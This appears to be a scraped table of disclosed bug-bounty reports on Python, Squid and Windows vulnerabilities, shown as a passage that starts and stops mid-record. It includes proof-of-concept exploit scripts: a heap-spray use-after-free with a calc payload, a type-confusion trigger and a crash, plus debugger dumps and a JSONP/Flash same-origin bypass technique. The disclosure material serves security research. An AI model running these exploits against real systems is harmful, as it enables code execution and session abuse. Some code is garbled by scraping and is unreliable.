7+                if (i > PY_SSIZE_T_MAX - j){
8+                    PyErr_SetString(PyExc_OverflowError,
9+                                    ""new string is too long"");
10+                    return NULL;
11+                }
12                 i += j;
13                 j = 0;
14             }
Proof of Concept
Run this script for a very simple crashing PoC for 32-bit python 2.7 which should crash at at address near 0x20202020 (since the ob_type field will be overwritten with spaces.) No idea if the heap manipulation used here will work on other platforms but it should be easy to do.
Code 205 BytesWrap lines Copy Download1import strop
2
3strs = []
4for i in range(20):
5  strs.append('\t\n' * 0x10000 + 'A' * 0x1000000)
6for i in range(20):
7  print hex(id(strs[i]))
8strs[14] = None
9strop.expandtabs(strs[15], 0x10001)
10print strs[15]Internet Bug Bounty  rewarded ianbeer with a $1,500 bounty. Apr 8th (9 years ago)Thanks Ian, we always appreciate fantastic detailed write-ups like this. We're awarding the minimum bounty because it's a relatively low severity issue (a rather obscure code path in a nearly obsolete module).
Resolved in the upcoming 2.7.7 release: http://hg.python.org/cpython/rev/5dabc2d2f776  closed the report and changed the status to Resolved. Updated Sep 15th (6 years ago)",https://hackerone.com/reports/6389,No value,No value,No value,2014,3,31,0,9
Internet Bug Bounty,1-10,1.0,No value,"$1,500.00",Critical,9.5,Memory Corruption - Generic,LZMADecompressor.decompress Use After Free,"johnleitch  submitted a report to Internet Bug Bounty.Sep 28th (6 years ago)I have submitted a vulnerability that has now been fixed. The report includes a proof of concept that demonstrates code execution. The submitted patch was accepted with minor changes.
https://bugs.python.org/issue28275

Python 3.5.2 suffers from a use after free vulnerability caused by the behavior of the LZMADecompressor.decompress method. The problem exists due to a dangling pointer created by an incomplete error path in the _lzma!decompress function.
static PyObject 
decompress(Decompressor d, uint8_t data, size_t len, Py_ssize_t max_length)
{
char input_buffer_in_use;
PyObject result;
lzma_stream *lzs = &d->lzs;
    / Prepend unconsumed input if necessary /
if (lzs->next_in != NULL) {
[...]
}
else {
lzs->next_in = data;
lzs->avail_in = len;
input_buffer_in_use = 0;
}
    result = decompress_buf(d, max_length);
if(result == NULL)
return NULL;
[...]
}
When the function is first called, lzs->next_in is NULL, so it is set using the data argument. If the subsequent call to decompress_buf fails because the stream is malformed, the function returns while maintaining the current value for lzs->next_in.
A couple returns later, the allocation pointed to by lzs->next_in (data) is freed:
static PyObject 
_lzma_LZMADecompressor_decompress(Decompressor self, PyObject args, PyObject kwargs)
{
PyObject return_value = NULL;
static char _keywords[] = {""data"", ""max_length"", NULL};
Py_buffer data = {NULL, NULL};
Py_ssize_t max_length = -1;
    if (!PyArg_ParseTupleAndKeywords(args, kwargs, ""y*|n:decompress"", _keywords,
&data, &max_length))
goto exit;
return_value = _lzma_LZMADecompressor_decompress_impl(self, &data, max_length);
exit:
/ Cleanup for data /
if (data.obj)
PyBuffer_Release(&data);
    return return_value;
}
At this point, any calls to decompress made to the same Decompressor instance (a typical use case--multiple calls may be necessary to decompress a single stream) will result in a memcpy to the dangling lzs->next_in pointer, and thus memory corruption.
static PyObject 
decompress(Decompressor d, uint8_t data, size_t len, Py_ssize_t max_length)
{
char input_buffer_in_use;
PyObject result;
lzma_stream *lzs = &d->lzs;
    / Prepend unconsumed input if necessary /
if (lzs->next_in != NULL) {
size_t avail_now, avail_total;
[...]
memcpy((void*)(lzs->next_in + lzs->avail_in), data, len);
lzs->avail_in += len;
input_buffer_in_use = 1;
}
else {
[...]
}
}
This vulnerability can be exploited to achieve arbitrary code execution. In applications where untrusted LZMA streams are received over a network, it might be possible to exploit this vulnerability remotely. A simple proof of concept that demonstrates a return-to-libc attack is attached.
import _lzma
from array import *
System address when tested: 76064070
d = _lzma.LZMADecompressor()
spray = [];
for x in range(0, 0x700):
meg = bytearray(b'\x76\x70\x40\x06' * int(0x100000 / 4));
spray.append(meg)
def foo():
for x in range(0, 2):
try:
d.decompress(b""\x20\x26\x20\x63\x61\x6c\x63\x00\x41\x41\x41\x41\x41\x41\x41\x41""  int(0x100 / (44)))
except:
pass
foo()
print(len(spray[0]))
print(len(spray))
To fix the issue, it is recommended that lzs->next_in be zeroed in the event the call to decompress_buf fails. A proposed patch is attached.
    result = decompress_buf(d, max_length);
if(result == NULL) {
lzs->next_in = 0;
return NULL;
}
A repro file is attached as well.
Exception details:
0:000> r
eax=0000000a ebx=009ef540 ecx=00000002 edx=41414141 esi=08b44970 edi=09275fe8
eip=6bf55149 esp=009ef3e0 ebp=009ef434 iopl=0         nv up ei pl nz na po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010203
VCRUNTIME140D!TrailingDownVec+0x1f9:
6bf55149 8917            mov     dword ptr [edi],edx  ds:002b:09275fe8=????????
0:000> k
ChildEBP RetAddr
009ef3e4 5d573f80 VCRUNTIME140D!TrailingDownVec+0x1f9 [f:\dd\vctools\crt\vcruntime\src\string\i386\memcpy.asm @ 658]
009ef434 5d573383 _lzma_d!decompress+0x130 [c:\source2\python-3.5.2\modules_lzmamodule.c @ 997]
009ef454 5d572049 _lzma_d!_lzma_LZMADecompressor_decompress_impl+0x93 [c:\source2\python-3.5.2\modules_lzmamodule.c @ 1097]
009ef49c 55e6dd40 _lzma_d!_lzma_LZMADecompressor_decompress+0x79 [c:\source2\python-3.5.2\modules\clinic_lzmamodule.c.h @ 99]
009ef4d4 55f65199 python35_d!PyCFunction_Call+0x80 [c:\source2\python-3.5.2\objects\methodobject.c @ 98]
009ef4fc 55f6008d python35_d!call_function+0x3e9 [c:\source2\python-3.5.2\python\ceval.c @ 4705]
009ef58c 55f6478d python35_d!PyEval_EvalFrameEx+0x509d [c:\source2\python-3.5.2\python\ceval.c @ 3238]
009ef5cc 55f5afbd python35_d!_PyEval_EvalCodeWithName+0x73d [c:\source2\python-3.5.2\python\ceval.c @ 4018]
009ef608 55f5af81 python35_d!PyEval_EvalCodeEx+0x2d [c:\source2\python-3.5.2\python\ceval.c @ 4039]
009ef63c 55fe67de python35_d!PyEval_EvalCode+0x21 [c:\source2\python-3.5.2\python\ceval.c @ 777]
009ef660 55fe2daa python35_d!run_mod+0x3e [c:\source2\python-3.5.2\python\pythonrun.c @ 976]
009ef69c 55fe3dac python35_d!PyRun_FileExFlags+0x9a [c:\source2\python-3.5.2\python\pythonrun.c @ 929]
009ef730 55fe2c5b python35_d!PyRun_SimpleFileExFlags+0x3ec [c:\source2\python-3.5.2\python\pythonrun.c @ 396]
009ef74c 55d39e6d python35_d!PyRun_AnyFileExFlags+0x6b [c:\source2\python-3.5.2\python\pythonrun.c @ 80]
009ef7a0 55d38821 python35_d!run_file+0x13d [c:\source2\python-3.5.2\modules\main.c @ 318]
009ef908 1c841331 python35_d!Py_Main+0xf01 [c:\source2\python-3.5.2\modules\main.c @ 768]
009ef918 1c84178e python_d!wmain+0x11 [c:\source2\python-3.5.2\programs\python.c @ 14]
009ef92c 1c8415da python_d!invoke_main+0x1e [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 89]
009ef984 1c84146d python_d!scrt_common_main_seh+0x15a [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 264]
009ef98c 1c8417a8 python_d!scrt_common_main+0xd [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 309]
009ef994 742438f4 python_d!wmainCRTStartup+0x8 [f:\dd\vctools\crt\vcstartup\src\startup\exe_wmain.cpp @ 17]
009ef9a8 77545de3 KERNEL32!BaseThreadInitThunk+0x24
009ef9f0 77545dae ntdll!RtlUserThreadStart+0x2f
009efa00 00000000 ntdll!_RtlUserThreadStart+0x1b
0:000> !heap -p -a edi
address 09275fe8 found in
_DPH_HEAP_ROOT @ 53a1000
in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
9182d68:          9275000             2000
5c949cd2 verifier!AVrfDebugPageHeapFree+0x000000c2
775be045 ntdll!RtlDebugFreeHeap+0x0000003c
7751cc3e ntdll!RtlpFreeHeap+0x00000c3e
7751b4c8 ntdll!RtlFreeHeap+0x00000268
591067a7 ucrtbased!free_base+0x00000027
5910394b ucrtbased!calloc_base+0x00000b5b
5910617c ucrtbased!free_dbg+0x0000007c
59106750 ucrtbased!free+0x00000010
55e781bd python35_d!_PyMem_RawFree+0x0000000d [c:\source2\python-3.5.2\objects\obmalloc.c @ 90]
55e77f32 python35_d!_PyMem_DebugFree+0x00000072 [c:\source2\python-3.5.2\objects\obmalloc.c @ 1892]
55e78434 python35_d!PyMem_RawFree+0x00000014 [c:\source2\python-3.5.2\objects\obmalloc.c @ 316]
55e77ad1 python35_d!_PyObject_Free+0x00000591 [c:\source2\python-3.5.2\objects\obmalloc.c @ 1618]
55e77f32 python35_d!_PyMem_DebugFree+0x00000072 [c:\source2\python-3.5.2\objects\obmalloc.c @ 1892]
55e78724 python35_d!PyObject_Free+0x00000014 [c:\source2\python-3.5.2\objects\obmalloc.c @ 410]
55e02005 python35_d!bytes_dealloc+0x00000015 [c:\source2\python-3.5.2\objects\bytesobject.c @ 956]
55e75f73 python35_d!_Py_Dealloc+0x00000023 [c:\source2\python-3.5.2\objects\object.c @ 1786]
55e922f7 python35_d!tupledealloc+0x000000c7 [c:\source2\python-3.5.2\objects\tupleobject.c @ 236]
55e75f73 python35_d!_Py_Dealloc+0x00000023 [c:\source2\python-3.5.2\objects\object.c @ 1786]
55f651a9 python35_d!call_function+0x000003f9 [c:\source2\python-3.5.2\python\ceval.c @ 4707]
55f6008d python35_d!PyEval_EvalFrameEx+0x0000509d [c:\source2\python-3.5.2\python\ceval.c @ 3238]
55f6478d python35_d!_PyEval_EvalCodeWithName+0x0000073d [c:\source2\python-3.5.2\python\ceval.c @ 4018]
55f5afbd python35_d!PyEval_EvalCodeEx+0x0000002d [c:\source2\python-3.5.2\python\ceval.c @ 4039]
55f5af81 python35_d!PyEval_EvalCode+0x00000021 [c:\source2\python-3.5.2\python\ceval.c @ 777]
55fe67de python35_d!run_mod+0x0000003e [c:\source2\python-3.5.2\python\pythonrun.c @ 976]
55fe2daa python35_d!PyRun_FileExFlags+0x0000009a [c:\source2\python-3.5.2\python\pythonrun.c @ 929]
55fe3dac python35_d!PyRun_SimpleFileExFlags+0x000003ec [c:\source2\python-3.5.2\python\pythonrun.c @ 396]
55fe2c5b python35_d!PyRun_AnyFileExFlags+0x0000006b [c:\source2\python-3.5.2\python\pythonrun.c @ 80]
55d39e6d python35_d!run_file+0x0000013d [c:\source2\python-3.5.2\modules\main.c @ 318]
55d38821 python35_d!Py_Main+0x00000f01 [c:\source2\python-3.5.2\modules\main.c @ 768]
1c841331 python_d!wmain+0x00000011 [c:\source2\python-3.5.2\programs\python.c @ 14]
1c84178e python_d!invoke_main+0x0000001e [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 89]
1c8415da python_d!scrt_common_main_seh+0x0000015a [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 264]
0:000> !analyze -v -nodb







                       Exception Analysis                                   *







FAULTING_IP:
VCRUNTIME140D!TrailingDownVec+1f9 [f:\dd\vctools\crt\vcruntime\src\string\i386\memcpy.asm @ 658]
6bf55149 8917            mov     dword ptr [edi],edx
EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 6bf55149 (VCRUNTIME140D!TrailingDownVec+0x000001f9)
ExceptionCode: c0000005 (Access violation)
ExceptionFlags: 00000000
NumberParameters: 2
Parameter[0]: 00000001
Parameter[1]: 09275fe8
Attempt to write to address 09275fe8
CONTEXT:  00000000 -- (.cxr 0x0;r)
eax=0000000a ebx=009ef540 ecx=00000002 edx=41414141 esi=08b44970 edi=09275fe8
eip=6bf55149 esp=009ef3e0 ebp=009ef434 iopl=0         nv up ei pl nz na po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010203
VCRUNTIME140D!TrailingDownVec+0x1f9:
6bf55149 8917            mov     dword ptr [edi],edx  ds:002b:09275fe8=????????
FAULTING_THREAD:  000043fc
DEFAULT_BUCKET_ID:  INVALID_POINTER_WRITE
PROCESS_NAME:  python_d.exe
ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.
EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.
EXCEPTION_PARAMETER1:  00000001
EXCEPTION_PARAMETER2:  09275fe8
WRITE_ADDRESS:  09275fe8 
FOLLOWUP_IP:
VCRUNTIME140D!TrailingDownVec+1f9 [f:\dd\vctools\crt\vcruntime\src\string\i386\memcpy.asm @ 658]
6bf55149 8917            mov     dword ptr [edi],edx
NTGLOBALFLAG:  2000000
APPLICATION_VERIFIER_FLAGS:  0
APP:  python_d.exe
ANALYSIS_VERSION: 6.3.9600.17029 (debuggers(dbg).140219-1702) x86fre
PRIMARY_PROBLEM_CLASS:  INVALID_POINTER_WRITE
BUGCHECK_STR:  APPLICATION_FAULT_INVALID_POINTER_WRITE_INVALID_POINTER_READ
LAST_CONTROL_TRANSFER:  from 5d573f80 to 6bf55149
STACK_TEXT:
009ef3e4 5d573f80 09275fe8 08b44970 0000000a VCRUNTIME140D!TrailingDownVec+0x1f9
009ef434 5d573383 060e9f40 08b44970 0000000a _lzma_d!decompress+0x130
009ef454 5d572049 060e9f40 009ef468 ffffffff _lzma_d!_lzma_LZMADecompressor_decompress_impl+0x93
009ef49c 55e6dd40 060e9f40 079cec40 00000000 _lzma_d!_lzma_LZMADecompressor_decompress+0x79
009ef4d4 55f65199 08b53db8 079cec40 00000000 python35_d!PyCFunction_Call+0x80
009ef4fc 55f6008d 009ef540 079cec40 06143c78 python35_d!call_function+0x3e9
009ef58c 55f6478d 06143c78 00000000 1c84114f python35_d!PyEval_EvalFrameEx+0x509d
009ef5cc 55f5afbd 079eae60 06143c78 06171978 python35_d!_PyEval_EvalCodeWithName+0x73d
009ef608 55f5af81 079eae60 06171978 06171978 python35_d!PyEval_EvalCodeEx+0x2d
009ef63c 55fe67de 079eae60 06171978 06171978 python35_d!PyEval_EvalCode+0x21
009ef660 55fe2daa 08db1470 08b4b168 06171978 python35_d!run_mod+0x3e
009ef69c 55fe3dac 06e40fc0 079f30e0 00000101 python35_d!PyRun_FileExFlags+0x9a
009ef730 55fe2c5b 06e40fc0 079f30e0 00000001 python35_d!PyRun_SimpleFileExFlags+0x3ec
009ef74c 55d39e6d 06e40fc0 079f30e0 00000001 python35_d!PyRun_AnyFileExFlags+0x6b
009ef7a0 55d38821 06e40fc0 06012fa6 009ef85c python35_d!run_file+0x13d
009ef908 1c841331 00000002 06012f80 009ef92c python35_d!Py_Main+0xf01
009ef918 1c84178e 00000002 06012f80 0601af40 python_d!wmain+0x11
009ef92c 1c8415da 851961c5 1c84114f 1c84114f python_d!invoke_main+0x1e
009ef984 1c84146d 009ef994 1c8417a8 009ef9a8 python_d!scrt_common_main_seh+0x15a
009ef98c 1c8417a8 009ef9a8 742438f4 006cd000 python_d!scrt_common_main+0xd
009ef994 742438f4 006cd000 742438d0 939c497b python_d!wmainCRTStartup+0x8
009ef9a8 77545de3 006cd000 5080bb84 00000000 KERNEL32!BaseThreadInitThunk+0x24
009ef9f0 77545dae ffffffff 7756b7d7 00000000 ntdll!__RtlUserThreadStart+0x2f
009efa00 00000000 1c84114f 006cd000 00000000 ntdll!_RtlUserThreadStart+0x1b
STACK_COMMAND:  .cxr 0x0 ; kb
FAULTING_SOURCE_LINE:  f:\dd\vctools\crt\vcruntime\src\string\i386\memcpy.asm
FAULTING_SOURCE_FILE:  f:\dd\vctools\crt\vcruntime\src\string\i386\memcpy.asm
FAULTING_SOURCE_LINE_NUMBER:  658
SYMBOL_STACK_INDEX:  0
SYMBOL_NAME:  vcruntime140d!TrailingDownVec+1f9
FOLLOWUP_NAME:  MachineOwner
MODULE_NAME: VCRUNTIME140D
IMAGE_NAME:  VCRUNTIME140D.dll
DEBUG_FLR_IMAGE_TIMESTAMP:  558ce3d5
FAILURE_BUCKET_ID:  INVALID_POINTER_WRITE_c0000005_VCRUNTIME140D.dll!TrailingDownVec
BUCKET_ID:  APPLICATION_FAULT_INVALID_POINTER_WRITE_INVALID_POINTER_READ_vcruntime140d!TrailingDownVec+1f9
ANALYSIS_SOURCE:  UM
FAILURE_ID_HASH_STRING:  um:invalid_pointer_write_c0000005_vcruntime140d.dll!trailingdownvec
FAILURE_ID_HASH:  {935a9c66-b210-2678-8c10-c746a999bfb6}
Followup: MachineOwner",https://hackerone.com/reports/172562,No value,No value,No value,2016,9,28,5,25
Internet Bug Bounty,1-10,1.0,No value,"$6,500.00",No value,0.0,None,Misc Python bugs (Memory Corruption & Use After Free),"pakt_  submitted a report to Internet Bug Bounty.Sep 29th (8 years ago)These bugs were reported directly to the Python dev team.
http://bugs.python.org/issue22518
http://bugs.python.org/issue22520
http://bugs.python.org/issue22519
http://bugs.python.org/issue22643
http://bugs.python.org/issue22517",https://hackerone.com/reports/38170,No value,No value,No value,2014,9,29,0,0
Internet Bug Bounty,1-10,1.0,No value,"$9,000.00",No value,0.0,None,Multiple Python integer overflows,"pakt_  submitted a report to Internet Bug Bounty.Feb 1st (8 years ago)These bugs were reported directly to the Python dev team.
http://bugs.python.org/issue23369
http://bugs.python.org/issue23365
http://bugs.python.org/issue23364
http://bugs.python.org/issue23366
http://bugs.python.org/issue23363
http://bugs.python.org/issue23490
http://bugs.python.org/issue23362
http://bugs.python.org/issue23367
http://bugs.python.org/issue23368
http://bugs.python.org/issue23361Internet Bug Bounty  rewarded pakt_ with a $9,000 bounty. Apr 6th (8 years ago)  closed the report and changed the status to Resolved. Updated Sep 15th (6 years ago)",https://hackerone.com/reports/55017,No value,No value,No value,2015,2,1,0,0
Internet Bug Bounty,1-10,1.0,No value,"$1,000.00",No value,0.0,Code Injection,msilib.OpenDatabase Type Confusion,"johnleitch  submitted a report to Internet Bug Bounty.Sep 12th (6 years ago)I have reported a vulnerability in Python that is now fixed. My patch was accepted with minor changes.

http://bugs.python.org/issue24594
The msilib.OpenDatabase method suffers from a type confusion vulnerability caused by the behavior of MsiOpenDatabase(), the underlying win32 function utilized. This is due to the unorthodox handling of the szPersist parameter: when an MSIDBOPEN_* value is passed, it is treated as a predefined persistence mode. However, when a larger value is passed, it is treated as a string pointer, which is used as the path to a new file.
Because the Python method msilib.OpenDatabase passes its persist parameter through to MsiOpenDatabase, it may be possible for an attacker to trigger the type confusion bug should the seemingly innocuous persist parameter be exposed as attack surface. This could have a few consequences: 
1) An attacker might be able to leverage this vulnerability to probe for valid addresses, which could then be used in another exploit to bypass ASLR/DEP.
2) An attacker might be able to leverage this vulnerability to dereference aribtrary values in memory, disclosing secrets.
3) An attacker may be able to spray memory with specially crafted string values, then leverage this vulnerability to pass one of the values as a persist string. Because this would lead to the creation of an MSI file in a location now controlled by the attacker, it could potentially be exploited to achieve remote code execution.
A Python script that demonstrates the vulnerability is as follows:
import msilib
msilib.OpenDatabase("""",0x41414141)
And it produces the following exception:
0:000> r
eax=41414141 ebx=00000000 ecx=0027f8c0 edx=41414142 esi=0027f8c0 edi=00000000
eip=757252aa esp=0027f874 ebp=0027f89c iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
KERNELBASE!lstrlenA+0x1a:
757252aa 8a08            mov     cl,byte ptr [eax]          ds:002b:41414141=??
0:000> !analyze -v -nodb







                       Exception Analysis                                   *







FAULTING_IP:
KERNELBASE!lstrlenA+1a
757252aa 8a08            mov     cl,byte ptr [eax]
EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 757252aa (KERNELBASE!lstrlenA+0x0000001a)
ExceptionCode: c0000005 (Access violation)
ExceptionFlags: 00000000
NumberParameters: 2
Parameter[0]: 00000000
Parameter[1]: 41414141
Attempt to read from address 41414141
CONTEXT:  00000000 -- (.cxr 0x0;r)
eax=41414141 ebx=00000000 ecx=0027f8c0 edx=41414142 esi=0027f8c0 edi=00000000
eip=757252aa esp=0027f874 ebp=0027f89c iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
KERNELBASE!lstrlenA+0x1a:
757252aa 8a08            mov     cl,byte ptr [eax]          ds:002b:41414141=??
FAULTING_THREAD:  00000d38
PROCESS_NAME:  python.exe
ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.
EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.
EXCEPTION_PARAMETER1:  00000000
EXCEPTION_PARAMETER2:  41414141
READ_ADDRESS:  41414141 
FOLLOWUP_IP:
msi!CApiConvertString::operator unsigned short const *+1b1d
622e1fa1 40              inc     eax
NTGLOBALFLAG:  70
APPLICATION_VERIFIER_FLAGS:  0
APP:  python.exe
ANALYSIS_VERSION: 6.3.9600.17029 (debuggers(dbg).140219-1702) x86fre
BUGCHECK_STR:  APPLICATION_FAULT_INVALID_POINTER_READ_FILL_PATTERN_41414141
PRIMARY_PROBLEM_CLASS:  INVALID_POINTER_READ_FILL_PATTERN_41414141
DEFAULT_BUCKET_ID:  INVALID_POINTER_READ_FILL_PATTERN_41414141
LAST_CONTROL_TRANSFER:  from 622e1fa1 to 757252aa
STACK_TEXT:
0027f89c 622e1fa1 41414141 41414141 623e22d0 KERNELBASE!lstrlenA+0x1a
0027fcfc 1d162217 01c54334 41414141 0027fd10 msi!CApiConvertString::operator unsigned short const *+0x1b1d
0027fd18 1e0aafd7 00000000 01d86940 01d7ea08 _msi!msiopendb+0x37
0027fd30 1e0edd10 01d7ea08 01d86940 00000000 python27!PyCFunction_Call+0x47
0027fd5c 1e0f017a 0027fdb4 01c86b18 01c86b18 python27!call_function+0x2b0
0027fdcc 1e0f1150 01cb4030 00000000 01c86b18 python27!PyEval_EvalFrameEx+0x239a
0027fe00 1e0f11b2 01c86b18 01cb4030 01c8aa50 python27!PyEval_EvalCodeEx+0x690
0027fe2c 1e11707a 01c86b18 01c8aa50 01c8aa50 python27!PyEval_EvalCode+0x22
0027fe44 1e1181c5 01d43a20 01c8aa50 01c8aa50 python27!run_mod+0x2a
0027fe64 1e118760 68e87408 003f2e93 00000101 python27!PyRun_FileExFlags+0x75
0027fea4 1e1190d9 68e87408 003f2e93 00000001 python27!PyRun_SimpleFileExFlags+0x190
0027fec0 1e038d35 68e87408 003f2e93 00000001 python27!PyRun_AnyFileExFlags+0x59
0027ff3c 1d00116d 00000002 003f2e70 003f1940 python27!Py_Main+0x965
0027ff80 75847c04 7ffde000 75847be0 0c2f39c0 python!tmainCRTStartup+0x10f
0027ff94 77c9b90f 7ffde000 0e681648 00000000 KERNEL32!BaseThreadInitThunk+0x24
0027ffdc 77c9b8da ffffffff 77c806e0 00000000 ntdll!RtlUserThreadStart+0x2f
0027ffec 00000000 1d001314 7ffde000 00000000 ntdll!_RtlUserThreadStart+0x1b
STACK_COMMAND:  .cxr 0x0 ; kb
SYMBOL_STACK_INDEX:  1
SYMBOL_NAME:  msi!CApiConvertString::operator unsigned short const *+1b1d
FOLLOWUP_NAME:  MachineOwner
MODULE_NAME: msi
IMAGE_NAME:  msi.dll
DEBUG_FLR_IMAGE_TIMESTAMP:  5450468f
FAILUREBUCKET_ID:  INVALID_POINTER_READ_FILL_PATTERN_41414141_c0000005_msi.dll!CApiConvertString::operator_unsigned_short_const*
BUCKETID:  APPLICATION_FAULT_INVALID_POINTER_READ_FILL_PATTERN_41414141_msi!CApiConvertString::operator_unsigned_short_const*+1b1d
ANALYSIS_SOURCE:  UM
FAILUREID_HASH_STRING:  um:invalid_pointer_read_fill_pattern_41414141_c0000005_msi.dll!capiconvertstring::operator_unsigned_short_const*
FAILURE_ID_HASH:  {11693fba-32c4-0880-2440-574cbd780159}
Followup: MachineOwner
To fix the issue, msiopendb() should perform whitelist validation of the persist value to confirm that it is a valid MSIDBOPEN_* constant. A proposed patch is attached.arice HackerOne staff  closed the report and changed the status to Resolved. Sep 20th (6 years ago)Internet Bug Bounty  rewarded johnleitch with a $1,000 bounty. Sep 20th (6 years ago)johnleitch   requested to disclose this report. Sep 20th (6 years ago)arice HackerOne staff  agreed to disclose this report. Sep 20th (6 years ago)  This report has been disclosed. Sep 20th (6 years ago)",https://hackerone.com/reports/167688,No value,No value,No value,2016,9,12,4,21
Internet Bug Bounty,1-10,1.0,No value,"$6,000.00",High,7.5,Classic Buffer Overflow,Buffer Overflow in ext_lm_group_acl helper,"aaron_costello  submitted a report to Internet Bug Bounty.Feb 4th (3 years ago)Summary
Due to incorrect buffer management ext_lm_group_acl is vulnerable to a denial of service attack when processing NTLM Authentication credentials. This problem is limited to installations using the
ext_lm_group_acl binary.
Affected Versions
Squid 2.x -> 2.7.STABLE9
Squid 3.x -> 3.5.28
Squid 4.x -> 4.9
Severity
Due to incorrect input validation the NTLM authentication credentials parser in ext_lm_group_acl may write to memory outside the credentials buffer. On systems with memory access protections this can result in the helper process being terminated unexpectedly. Resulting in the Squid process also terminating and a denial of service for all clients using the proxy.
Supporting Material/References:
Advisory : http://www.squid-cache.org/Advisories/SQUID-2020_3.txt
Remediation
An official patch is available from the Squid archives for both Squid 3.5 and Squid 4. 
Timeline
2019-11-11 : I reported the issue
2019-11-18 : I made a PR on GitHub with a fix
2019-11-22 :  Fix was merged
Impact
See 'Severity' section of report.",https://hackerone.com/reports/789034,No value,No value,No value,2020,2,4,21,58
Internet Bug Bounty,1-10,1.0,No value,"$5,000.00",No value,0.0,Memory Corruption - Generic,Bad Write in TTF font parsing (win32k.sys),"dirtybit  submitted a report to Internet Bug Bounty.Feb 18th (8 years ago)This bug was originally reported through Project Zero at Google. Alex Rice suggested to me that I could potentially receive a bounty through Hacker One so I am also opening a report here.
The vulnerability reference numbers are
MS15-010
CVE-2015-0059
The original bug report is
https://code.google.com/p/google-security-research/issues/detail?id=172
Microsoft released a patch on 2/10/15
https://technet.microsoft.com/library/security/dn903755.aspx
Repros, loader, and minidumps are attached7 attachments:F29613: load_font.cppF29614: WIN8_win32k_itrp_SHE_0x75892_WRITE.dmpF29615: WIN8_win32k_itrp_SHE_0x75892_WRITE.TTFF29616: WIN8_win32k_itrp_SHE_0x75892_WRITE.txtF29617: WIN8_win32k_itrp_SHE_2ee_WRITE.ttfF29618: WIN8_win32k_itrp_SHE_2ee_WRITE.dmpF29619: WIN8_win32k_itrp_SHE_2ee_WRITE.txt",https://hackerone.com/reports/48100,No value,No value,No value,2015,2,18,17,46
Internet Bug Bounty,1-10,1.0,No value,"$3,000.00",No value,0.0,None,Bypassing Same Origin Policy With JSONP APIs and Flash,"molnarg  submitted a report to Internet Bug Bounty.Apr 29th (9 years ago)Overview
This is a new type of web vulnerability that is made possible by two seemingly unrelated things:

the way JSONP APIs work
the way Flash handles malformed SWF files

and has an effect and limitations similar to XSS flaws:

the user has to visit a website set up by the attacker in order to trigger the vulnerability
as a result, the attacker can make arbitrary HTTP request to the vulnerable domain (with the user's cookies sent along with the request) and read the responses

Description
[JSONP] APIs return JSON data wrapped by an invocation of a callback function specified by the caller.  The caller first defines a JavaScript function and then injects a script tag with the JSON API URL as if it were a JavaScript file to load. JSONP APIs became popular because making JSONP requests are is not forbidden by the Same Origin Policy.
From the point of view of this discussion, the important part is that the first bytes of the response can be controlled by a GET parameter (typically named callback).
If an attacker can create a Flash file, that can be passed as callback parameter to a JSONP API, and passes the filters applied to the callback name, then she is able to load this Flash file in the security context of the JSONP API's domain (the target domain). After the Flash file is loaded, she can make HTTP requests through it to the target domain in the name of the user.
Example:
    Code 122 BytesWrap lines Copy Download1<object type=""application/x-shockwave-flash""
2            data=""http://example.com/jsonp-api?callback=__URL_ENCODED_SWF__"">
Code 67 BytesWrap lines Copy Download1      <param name=""AllowScriptAccess"" value=""always"">
2    </object>
The response to the HTTP request:
    SWF_FILE({""actual"": ""API"", ""response"": 15})
There is two significant problems that have to be solved by an attacker:

the end of the response is the actual JSON API response, and that makes the response as a whole an invalid SWF file.
callback names are almost always filtered, forcing the callback parameter into the [A-Za-z0-9] range

The first problem is in fact solved by the way Flash handles invalid SWF files: it ignores additional bytes at the end of an otherwise valid Flash file.
The second problem turns out to be solvable too. The SWF file format specifies a way to compress the whole file (except an 8 byte header) as a DEFLATE stream. It is possible to create a DEFLATE stream in the [A-Za-z0-9] character range for arbitrary binary data. (As proven by my [ascii-zip] project)
As a demonstration, I've created a Flash file in the given character range that can load an arbitrary SWF file given by the embedder site (the attacker website) into it's security context (the target domain's security context):
